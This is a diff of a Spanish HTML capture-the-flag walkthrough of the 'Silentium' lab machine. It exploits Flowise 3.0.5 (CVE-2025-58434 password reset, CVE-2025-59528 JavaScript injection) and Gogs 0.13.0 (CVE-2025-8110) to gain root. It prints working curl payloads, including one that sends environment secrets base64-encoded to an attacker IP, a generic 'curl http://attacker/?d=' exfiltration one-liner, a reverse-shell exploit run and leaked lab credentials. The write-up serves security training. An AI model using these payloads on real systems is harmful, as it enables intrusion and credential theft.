+    <div class="step-number">Paso 1 — Reconocimiento</div>
+    <h3>Escaneo de puertos — nmap</h3>
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>Todo pentest comienza identificando la superficie de ataque. Escaneamos todos los puertos (<code>-p-</code>) para no perdernos nada, luego profundizamos con scripts NSE en los abiertos.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p-</span> <span class="flag-opt">--open</span> <span class="flag-opt">-n</span> <span class="flag-opt">-T4</span> <span class="flag-opt">--min-rate</span> <span class="param">5000</span> <span class="ip">10.129.26.220</span></div>
+      <div class="cmd-line"><span class="cmd">nmap</span> <span class="flag-opt">-p22,80</span> <span class="flag-opt">-sC</span> <span class="flag-opt">-sV</span> <span class="ip">10.129.26.220</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://silentium.htb/</div>
-            <div class="interpret-box">
-              <strong>¿Qué nos dice este output?</strong>
-              Solo dos puertos abiertos: SSH (22) y HTTP (80). El servidor web redirige a <code>silentium.htb</code>, indicando virtual hosting. Esto significa que el nombre de dominio es importante y debemos agregarlo a <code>/etc/hosts</code>. Con tan pocos puertos, el vector de entrada casi seguro pasa por la web.
-            </div>
-            <div class="decision-box">
-              <strong>Decisión</strong>
-              Agregar <code>10.129.26.220 silentium.htb staging.silentium.htb</code> a <code>/etc/hosts</code> y enumerar el sitio web y sus subdominios.
-            </div>
-          </div>
-        </div>
+|_http-title: Did not follow redirect to http://silentium.htb/</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>Solo 2 puertos abiertos: <code>SSH (22)</code> y <code>HTTP (80)</code></li>
+        <li>El servidor redirige a <code>silentium.htb</code> — virtual hosting activo</li>
+        <li>Con tan pocos puertos, el vector de entrada pasa por la web</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Agregar <code>10.129.26.220 silentium.htb staging.silentium.htb</code> a <code>/etc/hosts</code> y enumerar subdominios.</p>
+    </div>
+  </div>
 
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">2</div>
-            <div class="step-title">Descubrimiento de subdominios y servicios web</div>
-          </div>
-          <div class="step-body">
-            <div class="why-box">
-              <strong>¿Por qué este paso?</strong>
-              Nginx puede servir múltiples aplicaciones en el mismo puerto 80 usando virtual hosting por nombre de dominio. Un subdominio diferente puede exponer una aplicación completamente distinta con su propia superficie de ataque.
-            </div>
-            <div class="cmd-box">
-              <span class="prompt">$ </span>curl <span class="cmd-flag">-si</span> http://silentium.htb/ <span class="cmd-comment"># Confirmar sitio principal</span><br>
-              <span class="prompt">$ </span>wget <span class="cmd-flag">-qO-</span> http://staging.silentium.htb/ | head -5 <span class="cmd-comment"># Probar subdominio</span>
-            </div>
-            <div class="output-box">&lt;title&gt;Flowise - Build AI Agents, Visually&lt;/title&gt;
-&lt;meta name="author" content="FlowiseAI" /&gt;</div>
-            <div class="interpret-box">
-              <strong>¿Qué nos dice este output?</strong>
-              El subdominio <code>staging.silentium.htb</code> expone una instancia de <strong>Flowise AI</strong>, una plataforma open-source para construir agentes de IA con LLMs. Al verificar la versión: <code>{"version":"3.0.5"}</code>. Esta versión es vulnerable a CVE-2025-58434 y CVE-2025-59528.
-            </div>
-            <div class="decision-box">
-              <strong>Decisión</strong>
-              Explotar CVE-2025-58434 para tomar control de la cuenta administradora de Flowise sin conocer la contraseña.
-            </div>
-          </div>
-        </div>
-      </div>
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Reconocimiento</div>
+    <h3>Descubrimiento de subdominios y Flowise AI</h3>
+    <div class="why-box">
+      <strong>¿Por qué este paso?</strong>
+      <p>Nginx puede servir múltiples aplicaciones con virtual hosting. Un subdominio diferente puede exponer una aplicación completamente distinta con su propia superficie de ataque.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-si</span> <span class="ip">http://silentium.htb/</span></div>
+      <div class="cmd-line"><span class="cmd">wget</span> <span class="flag-opt">-qO-</span> <span class="ip">http://staging.silentium.htb/</span> | <span class="cmd">head</span> <span class="flag-opt">-5</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>&lt;title&gt;Flowise - Build AI Agents, Visually&lt;/title&gt;
+&lt;meta name="author" content="FlowiseAI" /&gt;</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <p>El subdominio <code>staging.silentium.htb</code> expone <strong>Flowise AI 3.0.5</strong>, una plataforma open-source para agentes de IA. Esta versión es vulnerable a CVE-2025-58434 y CVE-2025-59528.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Explotar CVE-2025-58434 para tomar control de la cuenta administradora de Flowise sin conocer la contraseña.</p>
+    </div>
+  </div>
+</div>
 
-      <!-- FASE 2: EXPLOTACION FLOWISE -->
-      <div class="card">
-        <div class="card-title">Fase 2 — Explotación Flowise (Foothold en Contenedor)</div>
+<!-- FASE 2: EXPLOTACIÓN FLOWISE -->
+<div class="section">
+  <h2>Fase 2 — Explotación Flowise (Foothold en Contenedor)</h2>
 
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">3</div>
-            <div class="step-title">CVE-2025-58434 — Password Reset sin Autenticación</div>
-          </div>
-          <div class="step-body">
-            <div class="why-box">
-              <strong>¿Qué es CVE-2025-58434?</strong>
-              El endpoint <code>POST /api/v1/account/forgot-password</code> de Flowise Enterprise está diseñado para enviar un token de reset por email. Sin embargo, debido a un error de implementación, el <code>tempToken</code> se devuelve directamente en la respuesta JSON de la API, en lugar de enviarse solo por correo. Esto permite a cualquier atacante obtener el token sin acceso al correo electrónico de la víctima.
-            </div>
-            <div class="cmd-box">
-              <span class="prompt">$ </span>curl <span class="cmd-flag">-s</span> <span class="cmd-flag">-X POST</span> http://staging.silentium.htb/api/v1/account/forgot-password \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-H</span> <span class="cmd-val">"Content-Type: application/json"</span> \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-d</span> <span class="cmd-val">'{"user": {"email": "ben@silentium.htb"}}'</span>
-            </div>
-            <div class="output-box">{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin",
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Explotación</div>
+    <h3>CVE-2025-58434 — Password Reset sin Autenticación</h3>
+    <div class="why-box">
+      <strong>¿Qué es CVE-2025-58434?</strong>
+      <p>El endpoint <code>POST /api/v1/account/forgot-password</code> devuelve el <code>tempToken</code> directamente en la respuesta JSON. Esto permite a cualquier atacante obtener el token sin acceso al correo electrónico de la víctima.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="flag-opt">-X POST</span> <span class="ip">http://staging.silentium.htb/api/v1/account/forgot-password</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-H</span> <span class="str-c">"Content-Type: application/json"</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-d</span> <span class="str-c">'{"user": {"email": "ben@silentium.htb"}}'</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin",
 "email":"ben@silentium.htb",
 "tempToken":"SNRBZURjOnWCjJnTHpcL0IK7iVwYcZDGNFv95Oj8lipk4mTK4m2j8vGBXBR32389",
-"tokenExpiry":"2026-04-12T11:59:42.125Z","status":"active",...}}</div>
-            <div class="interpret-box">
-              <strong>¿Qué nos dice este output?</strong>
-              El servidor devuelve el <code>tempToken</code> en texto plano en la respuesta. Este token, combinado con el email del usuario, permite cambiar la contraseña sin conocer la original. El campo <code>tokenExpiry</code> indica que expira en ~15 minutos — hay que actuar rápido.
-            </div>
-            <div class="cmd-box">
-              <span class="comment" style="color:var(--text-muted)"># Usar el tempToken para establecer nueva contraseña</span><br>
-              <span class="prompt">$ </span>curl <span class="cmd-flag">-s</span> <span class="cmd-flag">-X POST</span> http://staging.silentium.htb/api/v1/account/reset-password \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-H</span> <span class="cmd-val">"Content-Type: application/json"</span> \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-d</span> <span class="cmd-val">'{"user": {"tempToken": "SNRBZU...", "email": "ben@silentium.htb", "password": "H4ck3d123!"}}'</span>
-            </div>
-            <div class="output-box">{"user":{"credential":"$2a$05$zwe.qKKUtqzZqZWPcxY51e...","tempToken":"","status":"active",...}}</div>
-            <div class="interpret-box">
-              <strong>¿Qué nos dice este output?</strong>
-              <code>tempToken</code> vacío y nuevo hash <code>credential</code> confirmados — contraseña cambiada exitosamente. Login en la UI de Flowise con <code>ben@silentium.htb : H4ck3d123!</code> para obtener la API key.
-            </div>
-            <div class="decision-box">
-              <strong>Decisión</strong>
-              Acceder al panel de Flowise → Settings → API Keys → Crear key → Usar para CVE-2025-59528.
-            </div>
-          </div>
-        </div>
+"tokenExpiry":"2026-04-12T11:59:42.125Z","status":"active",...}}</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <p>El <code>tempToken</code> en texto plano en la respuesta. Este token permite cambiar la contraseña sin conocer la original. El <code>tokenExpiry</code> indica ~15 minutos.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Usar el tempToken para establecer nueva contraseña</span></div>
+      <div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="flag-opt">-X POST</span> <span class="ip">http://staging.silentium.htb/api/v1/account/reset-password</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-H</span> <span class="str-c">"Content-Type: application/json"</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-d</span> <span class="str-c">'{"user": {"tempToken": "SNRBZU...", "email": "ben@silentium.htb", "password": "H4ck3d123!"}}'</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>{"user":{"credential":"$2a$05$zwe.qKKUtqzZqZWPcxY51e...","tempToken":"","status":"active",...}}</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Credenciales obtenidas</strong>
+      <p><code>tempToken</code> vacío y nuevo hash confirmados — contraseña cambiada exitosamente. Login con <code style="color:var(--green)">ben@silentium.htb : H4ck3d123!</code></p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Acceder al panel de Flowise → Settings → API Keys → Crear key → Usar para CVE-2025-59528.</p>
+    </div>
+  </div>
 
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">4</div>
-            <div class="step-title">CVE-2025-59528 — CustomMCP Injection → RCE como root en contenedor</div>
-          </div>
-          <div class="step-body">
-            <div class="why-box">
-              <strong>¿Qué es CVE-2025-59528?</strong>
-              El nodo <code>CustomMCP</code> de Flowise permite configurar servidores MCP externos. La función <code>convertToValidJSONString</code> toma el parámetro <code>mcpServerConfig</code> y lo pasa directamente al constructor <code>Function('return ' + inputString)()</code> de JavaScript sin sanitizar. Esto permite ejecutar código JavaScript arbitrario en el proceso Node.js del servidor, que corre como <strong>root dentro del contenedor Docker</strong>.
-            </div>
-            <div class="cmd-box">
-              <span class="comment" style="color:var(--text-muted)"># Verificar RCE con sleep (time-based)</span><br>
-              <span class="prompt">$ </span>time curl <span class="cmd-flag">-s</span> <span class="cmd-flag">-X POST</span> http://staging.silentium.htb/api/v1/node-load-method/customMCP \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-H</span> <span class="cmd-val">"Authorization: Bearer HvH4ymS6dga9sijX_uP3e0xNBRS2rv6BDL-PGL4Phpo"</span> \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-d</span> <span class="cmd-val">'{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"sleep 5\");return 1;})()})"</span>
-            </div>
-            <div class="output-box">real 0m5.217s  ← 5 segundos de delay confirman ejecución</div>
-            <div class="interpret-box">
-              <strong>¿Qué nos dice este output?</strong>
-              El request tardó exactamente 5 segundos — el <code>sleep 5</code> se ejecutó en el servidor. RCE confirmado. El proceso corre como <code>uid=0(root)</code> dentro del contenedor (verificado con callback HTTP).
-            </div>
-            <div class="cmd-box">
-              <span class="comment" style="color:var(--text-muted)"># Exfiltrar datos via curl callback a HTTP server local</span><br>
-              <span class="prompt">$ </span>python3 <span class="cmd-flag">-m</span> http.server <span class="cmd-val">80</span> <span class="cmd-comment"># En terminal separada</span><br><br>
-              <span class="comment" style="color:var(--text-muted)"># Payload que exfiltra variables de entorno</span><br>
-              <span class="prompt">$ </span>curl ... <span class="cmd-flag">-d</span> <span class="cmd-val">'{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");const r=cp.execSync(\"env|grep -iE pass|secret\").toString();cp.execSync(\"curl http://10.10.14.31/?d=\"+Buffer.from(r).toString(\"base64\"));return 1;})()})"</span>
-            </div>
-            <div class="output-box">10.129.26.220 - GET /?d=RkxPV0lTRV9QQVNTV09SRD1GMWwzX2QwY2szcgpTTVRQX1BBU1NXT1JE...
-
-# Decodificado base64:
-FLOWISE_PASSWORD=F1l3_d0ck3r
+  <div class="step-box">
+    <div class="step-number">Paso 4 — Explotación</div>
+    <h3>CVE-2025-59528 — CustomMCP Injection → RCE como root en contenedor</h3>
+    <div class="why-box">
+      <strong>¿Cómo funciona el ataque?</strong>
+      <p>El nodo <code>CustomMCP</code> de Flowise pasa <code>mcpServerConfig</code> directamente al constructor <code>Function('return ' + inputString)()</code> de JavaScript sin sanitizar. Esto permite ejecutar código arbitrario en el proceso Node.js, que corre como <strong>root dentro del contenedor Docker</strong>.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Verificar RCE con sleep (time-based)</span></div>
+      <div class="cmd-line"><span class="cmd">time</span> <span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="flag-opt">-X POST</span> <span class="ip">http://staging.silentium.htb/api/v1/node-load-method/customMCP</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-H</span> <span class="str-c">"Authorization: Bearer HvH4ymS6dga9sijX_uP3e0xNBRS2rv6BDL-PGL4Phpo"</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-d</span> <span class="str-c">'{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){...execSync(\"sleep 5\")...})()})"}}'</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>real 0m5.217s  ← 5 segundos de delay confirman ejecución</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <p>El request tardó exactamente 5 segundos — el <code>sleep 5</code> se ejecutó en el servidor. RCE confirmado como <code>uid=0(root)</code> dentro del contenedor.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Exfiltrar variables de entorno via callback HTTP</span></div>
+      <div class="cmd-line"><span class="cmd">python3</span> <span class="flag-opt">-m</span> <span class="param">http.server</span> <span class="param">80</span> <span class="comment-c"># En terminal separada</span></div>
+      <div class="cmd-line" style="margin-top:.5rem;"><span class="comment-c"># Payload que exfiltra env vars en base64</span></div>
+      <div class="cmd-line"><span class="cmd">curl</span> ... <span class="flag-opt">-d</span> <span class="str-c">'...execSync("curl http://10.10.14.31/?d="+Buffer.from(r).toString("base64"))...'</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output — Callback recibido y decodificado</div>
+      <pre>FLOWISE_PASSWORD=F1l3_d0ck3r
 SMTP_PASSWORD=r04D!!_R4ge
-JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDD</div>
-            <div class="interpret-box">
-              <strong>¿Qué nos dice este output?</strong>
-              Credenciales extraídas del entorno del contenedor. La contraseña <code>r04D!!_R4ge</code> es reutilizada para el usuario <code>ben</code> en SSH del host. Este es el patrón de reutilización de credenciales más común en entornos Docker mal configurados.
-            </div>
-            <div class="decision-box">
-              <strong>Decisión</strong>
-              Conectarse por SSH como <code>ben</code> con la contraseña exfiltrada y obtener <code>user.txt</code>.
-            </div>
-          </div>
-        </div>
-      </div>
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDD</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Credenciales del contenedor obtenidas</strong>
+      <p>La contraseña <code style="color:var(--green)">r04D!!_R4ge</code> (SMTP_PASSWORD) es reutilizada para el usuario <code>ben</code> en SSH del host. Patrón de reutilización de credenciales en entornos Docker.</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Conectarse por SSH como <code>ben</code> con la contraseña exfiltrada y obtener <code>user.txt</code>.</p>
+    </div>
+  </div>
+</div>
 
-      <!-- FASE 3: USER FLAG -->
-      <div class="card">
-        <div class="card-title">Fase 3 — Acceso al Host (User Flag)</div>
+<!-- FASE 3: USER FLAG -->
+<div class="section">
+  <h2>Fase 3 — Acceso al Host (User Flag)</h2>
 
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">5</div>
-            <div class="step-title">SSH como ben — Credenciales reutilizadas del contenedor</div>
-          </div>
-          <div class="step-body">
-            <div class="why-box">
-              <strong>¿Por qué funciona?</strong>
-              La contraseña <code>SMTP_PASSWORD=r04D!!_R4ge</code> encontrada en las variables de entorno del contenedor fue reutilizada para el usuario <code>ben</code> en el host. Esta es una mala práctica muy común en infraestructuras donde el mismo administrador gestiona tanto los contenedores como los sistemas operativos subyacentes.
-            </div>
-            <div class="cmd-box">
-              <span class="prompt">$ </span>ssh <span class="cmd-val">ben@10.129.26.220</span> <span class="cmd-comment"># Password: r04D!!_R4ge</span><br>
-              <span class="prompt">ben@silentium:~$ </span>cat user.txt
-            </div>
-            <div class="output-box">uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
+  <div class="step-box">
+    <div class="step-number">Paso 5 — Acceso</div>
+    <h3>SSH como ben — Credenciales reutilizadas del contenedor</h3>
+    <div class="why-box">
+      <strong>¿Por qué funciona?</strong>
+      <p>La contraseña <code>SMTP_PASSWORD=r04D!!_R4ge</code> encontrada en las variables de entorno del contenedor fue reutilizada para el usuario <code>ben</code> en el host. Mala práctica muy común en infraestructuras donde el mismo administrador gestiona contenedores y hosts.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">ssh</span> <span class="user-c">ben</span>@<span class="ip">10.129.26.220</span> <span class="comment-c"># Password: r04D!!_R4ge</span></div>
+      <div class="cmd-line"><span class="user-c">ben@silentium:~$</span> <span class="cmd">cat</span> <span class="param">user.txt</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
 
-284c42dd13ced960cb1605b050ebcd09</div>
-            <div class="interpret-box">
-              <strong>Flag capturada.</strong>
-              Acceso como <code>ben</code> en el host. Enumeración post-acceso revela Gogs 0.13.0 corriendo como root en <code>127.0.0.1:3001</code> — vulnerable a CVE-2025-8110.
-            </div>
-          </div>
-        </div>
+284c42dd13ced960cb1605b050ebcd09</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Flag capturada</strong>
+      <p>Acceso como <code>ben</code> en el host. Enumeración post-acceso revela Gogs 0.13.0 corriendo como root en <code>127.0.0.1:3001</code>.</p>
+    </div>
+  </div>
 
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">6</div>
-            <div class="step-title">Enumeración del host — Descubrimiento de Gogs interno</div>
-          </div>
-          <div class="step-body">
-            <div class="cmd-box">
-              <span class="prompt">ben@silentium:~$ </span>ss <span class="cmd-flag">-tlnp</span> | grep LISTEN<br>
-              <span class="prompt">ben@silentium:~$ </span>ps aux | grep gogs
-            </div>
-            <div class="output-box">LISTEN 0  4096  127.0.0.1:3001  0.0.0.0:*
+  <div class="step-box">
+    <div class="step-number">Paso 6 — Enumeración</div>
+    <h3>Descubrimiento de Gogs interno</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="user-c">ben@silentium:~$</span> <span class="cmd">ss</span> <span class="flag-opt">-tlnp</span> | <span class="cmd">grep</span> <span class="param">LISTEN</span></div>
+      <div class="cmd-line"><span class="user-c">ben@silentium:~$</span> <span class="cmd">ps</span> <span class="param">aux</span> | <span class="cmd">grep</span> <span class="param">gogs</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>LISTEN 0  4096  127.0.0.1:3001  0.0.0.0:*
 LISTEN 0  4096  127.0.0.1:3000  0.0.0.0:*  ← Docker proxy
 
-root  1516  /opt/gogs/gogs/gogs web</div>
-            <div class="interpret-box">
-              <strong>¿Qué nos dice este output?</strong>
-              Gogs corre en el puerto 3001 del localhost <strong>como root</strong>. La versión 0.13.0 (confirmada en <code>/opt/gogs/gogs/custom/conf/app.ini</code>) es vulnerable a CVE-2025-8110 — una race condition de symlink que permite inyectar comandos en el <code>sshCommand</code> de git config.
-            </div>
-            <div class="decision-box">
-              <strong>Decisión</strong>
-              Crear túnel SSH para acceder a Gogs, registrar usuario, y ejecutar CVE-2025-8110.
-            </div>
-          </div>
-        </div>
-      </div>
+root  1516  /opt/gogs/gogs/gogs web</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <p>Gogs corre en puerto 3001 del localhost <strong style="color:var(--red)">como root</strong>. Versión 0.13.0 confirmada — vulnerable a CVE-2025-8110 (race condition de symlink).</p>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Crear túnel SSH para acceder a Gogs, registrar usuario, y ejecutar CVE-2025-8110.</p>
+    </div>
+  </div>
+</div>
 
-      <!-- FASE 4: PRIVESC -->
-      <div class="card">
-        <div class="card-title">Fase 4 — Escalada de Privilegios (CVE-2025-8110 Gogs RCE)</div>
+<!-- FASE 4: PRIVESC -->
+<div class="section">
+  <h2>Fase 4 — Escalada de Privilegios (CVE-2025-8110)</h2>
 
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">7</div>
-            <div class="step-title">CVE-2025-8110 — Gogs Symlink Race Condition → RCE como root</div>
-          </div>
-          <div class="step-body">
-            <div class="why-box">
-              <strong>¿Qué es CVE-2025-8110?</strong>
-              Gogs 0.13.0 tiene una vulnerabilidad de enlace simbólico en el manejo de repositorios git. Un usuario autenticado puede: (1) crear un repo, (2) subir un symlink <code>malicious_link → .git/config</code>, (3) usar la API para sobreescribir el archivo a través del symlink con un git config malicioso que incluye <code>sshCommand = /bin/bash -c 'reverse shell'</code>. Cuando Gogs procesa una operación git interna (como <code>git fetch</code>), ejecuta el <code>sshCommand</code> con los privilegios del proceso de Gogs — en este caso, <strong>root</strong>.
-            </div>
-            <div class="cmd-box">
-              <span class="comment" style="color:var(--text-muted)"># Paso 1: Túnel SSH para acceder a Gogs</span><br>
-              <span class="prompt">$ </span>ssh <span class="cmd-flag">-L</span> <span class="cmd-val">3001:127.0.0.1:3001</span> ben@10.129.26.220<br><br>
-              <span class="comment" style="color:var(--text-muted)"># Paso 2: Registrar usuario en http://localhost:3001 (browser)</span><br>
-              <span class="comment" style="color:var(--text-muted)"># Paso 3: Generar API token en Settings → Applications</span><br><br>
-              <span class="comment" style="color:var(--text-muted)"># Paso 4: Ejecutar exploit</span><br>
-              <span class="prompt">$ </span>python3 CVE-2025-8110.py \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-u</span> <span class="cmd-val">http://127.0.0.1:3001</span> \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-lh</span> <span class="cmd-val">10.10.14.31</span> \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-lp</span> <span class="cmd-val">5555</span> \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">--skip-register</span> <span class="cmd-flag">-user</span> <span class="cmd-val">pedro</span> <span class="cmd-flag">-pass</span> <span class="cmd-val">admin123</span> \<br>
-              &nbsp;&nbsp;<span class="cmd-flag">-token</span> <span class="cmd-val">3ff926a33d4bf24efe319e2d966e721e049d3fb1</span>
-            </div>
-            <div class="output-box">[+] Using provided API token
+  <div class="step-box">
+    <div class="step-number">Paso 7 — Escalada</div>
+    <h3>CVE-2025-8110 — Gogs Symlink Race Condition → RCE como root</h3>
+    <div class="why-box">
+      <strong>¿Qué es CVE-2025-8110?</strong>
+      <p>Gogs 0.13.0 tiene una vulnerabilidad de enlace simbólico en el manejo de repositorios git. Un usuario puede: (1) crear un repo, (2) subir un symlink <code>malicious_link → .git/config</code>, (3) sobreescribir el archivo con un git config que incluye <code>sshCommand = /bin/bash -c 'reverse shell'</code>. Gogs ejecuta el <code>sshCommand</code> con privilegios de root.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Paso 1: Túnel SSH para acceder a Gogs</span></div>
+      <div class="cmd-line"><span class="cmd">ssh</span> <span class="flag-opt">-L</span> <span class="param">3001:127.0.0.1:3001</span> <span class="user-c">ben</span>@<span class="ip">10.129.26.220</span></div>
+      <div class="cmd-line" style="margin-top:.5rem;"><span class="comment-c"># Paso 2: Registrar usuario en http://localhost:3001</span></div>
+      <div class="cmd-line"><span class="comment-c"># Paso 3: Generar API token en Settings → Applications</span></div>
+      <div class="cmd-line" style="margin-top:.5rem;"><span class="comment-c"># Paso 4: Ejecutar exploit</span></div>
+      <div class="cmd-line"><span class="cmd">python3</span> <span class="param">CVE-2025-8110.py</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-u</span> <span class="ip">http://127.0.0.1:3001</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-lh</span> <span class="ip">10.10.14.31</span> <span class="flag-opt">-lp</span> <span class="param">5555</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">--skip-register</span> <span class="flag-opt">-user</span> <span class="param">pedro</span> <span class="flag-opt">-pass</span> <span class="param">admin123</span> \</div>
+      <div class="cmd-line">  <span class="flag-opt">-token</span> <span class="param">3ff926a33d4bf24efe319e2d966e721e049d3fb1</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output — Exploit exitoso</div>
+      <pre>[+] Using provided API token
 [+] Authenticated successfully
 Repo creation status: 201
 Cloning into '/tmp/279fcf71ea82'...
@@ -556,265 +479,256 @@ To http://127.0.0.1:3001/pedro/279fcf71ea82.git
 # En listener nc -lvnp 5555:
 connect to [10.10.14.31] from [10.129.27.58] 51204
 root@silentium:/opt/gogs/gogs/data/tmp/local-repo/4# whoami
-root</div>
-            <div class="interpret-box">
-              <strong>Shell root obtenida.</strong>
-              El exploit crea un repositorio, sube el symlink <code>malicious_link → .git/config</code>, sobreescribe el config con un <code>sshCommand</code> malicioso, y cuando Gogs procesa el PUT del archivo, ejecuta el comando como root, enviando una reverse shell al listener.
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- FASE 5: ROOT FLAG -->
-      <div class="card">
-        <div class="card-title">Fase 5 — Root Flag</div>
-
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">8</div>
-            <div class="step-title">Captura de root.txt</div>
-          </div>
-          <div class="step-body">
-            <div class="cmd-box">
-              <span class="prompt">root@silentium:~# </span>cat /root/root.txt
-            </div>
-            <div class="output-box">bbc834baed5369d0353ac80b8d6b180e</div>
-            <div class="interpret-box">
-              <strong>Máquina comprometida completamente.</strong>
-              Acceso root en el host obtenido. Cadena completa: unauthenticated password reset → API key → CustomMCP RCE en contenedor → exfiltración de credenciales → SSH → Gogs symlink RCE → root.
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- LECCIONES APRENDIDAS -->
-      <div class="card">
-        <div class="card-title">Lecciones Aprendidas — Para el Atacante</div>
-        <div class="rec-box">
-          <div class="rec-icon">🔑</div>
-          <div>
-            <div class="rec-title">Reutilización de credenciales entre contenedor y host</div>
-            <div class="rec-desc">Las variables de entorno del contenedor Docker (<code>SMTP_PASSWORD</code>) contenían la misma contraseña del usuario SSH del host. Siempre exfiltrar <code>env</code>, <code>printenv</code> y archivos <code>.env</code> desde cualquier RCE en contenedor.</div>
-          </div>
-        </div>
-        <div class="rec-box">
-          <div class="rec-icon">🔗</div>
-          <div>
-            <div class="rec-title">Exfiltración de datos cuando no hay reverse shell directa</div>
-            <div class="rec-desc">Cuando el contenedor no podía conectar en puertos altos (4444), el puerto 80 sí tenía salida. La técnica de callback HTTP con base64 es universal: <code>curl http://attacker/?d=$(command|base64 -w0)</code>.</div>
-          </div>
-        </div>
-        <div class="rec-box">
-          <div class="rec-icon">🧬</div>
-          <div>
-            <div class="rec-title">Servicios internos como vector de privesc</div>
-            <div class="rec-desc"><code>ss -tlnp</code> reveló Gogs en <code>127.0.0.1:3001</code> corriendo como root. Los servicios que escuchan solo en localhost son frecuentemente olvidados por los hardening teams y representan vectores de escalada críticos.</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- RECOMENDACIONES DEFENSIVAS -->
-      <div class="card">
-        <div class="card-title">Recomendaciones para el Defensor</div>
-        <div class="rec-box">
-          <div class="rec-icon">🛡️</div>
-          <div>
-            <div class="rec-title">Actualizar Flowise a versión 3.0.6+</div>
